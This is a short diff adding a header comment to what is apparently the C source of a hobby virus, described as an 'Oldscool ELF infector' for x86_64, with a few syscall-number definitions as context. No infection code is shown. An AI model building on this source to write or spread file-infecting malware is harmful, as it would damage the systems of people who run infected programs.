@@ -1,3 +1,8 @@
+/* -=\ Cool-retro-virus /=-
+ * Oldscool ELF infector for fun and for x86_64 systems.
+ *
+ * Copyright: Robin Hack <hack.robin@gmail.com>
+ */
 #define SYS_READ	0
 #define SYS_WRITE	1
 #define SYS_OPEN	2
